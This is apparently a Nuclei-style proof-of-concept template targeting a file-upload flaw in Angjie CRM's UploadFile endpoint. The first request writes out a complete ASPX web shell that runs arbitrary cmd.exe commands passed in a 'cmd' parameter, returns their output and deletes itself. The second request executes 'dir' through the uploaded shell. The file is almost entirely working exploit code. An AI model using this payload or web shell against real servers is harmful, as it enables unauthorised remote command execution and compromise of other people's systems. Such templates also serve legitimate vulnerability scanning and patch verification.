id: poc-qh7idvyu9nrbt50k
info:
  name: 昂捷CRM UploadFile 存在文件上传致RCE漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: rce,file-upload,2025
http:
- raw:
  - 'POST /file/UploadFile?fileinfo={''UploadUserNo'':''0000'',''LastChunk'':true,''FileName'':''a1.aspx'',''IsUseMongdb'':true,''UploadTime'':''2025-06-18T12:11:56''} HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/javascript, */*; q=0.01

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36

    Accept-Encoding: gzip, deflate, br

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    Content-Type: application/x-www-form-urlencoded


    <%@ Page Language="Jscript" validateRequest="false" %>

    <%

    var c=new System.Diagnostics.ProcessStartInfo("cmd");

    var e=new System.Diagnostics.Process();

    var out:System.IO.StreamReader,EI:System.IO.StreamReader;

    c.UseShellExecute=false;

    c.RedirectStandardOutput=true;

    c.RedirectStandardError=true;

    e.StartInfo=c;

    c.Arguments="/c " + Request.Item["cmd"];

    e.Start();

    out=e.StandardOutput;

    EI=e.StandardError;

    e.Close();

    Response.Write(out.ReadToEnd() + EI.ReadToEnd());

    System.IO.File.Delete(Request.PhysicalPath);

    Response.End();%>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /TempFileNew/0000_202506181211560000_a1.aspx HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2244.69 Safari/537.36

    Content-Type: application/x-www-form-urlencoded


    cmd=dir'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
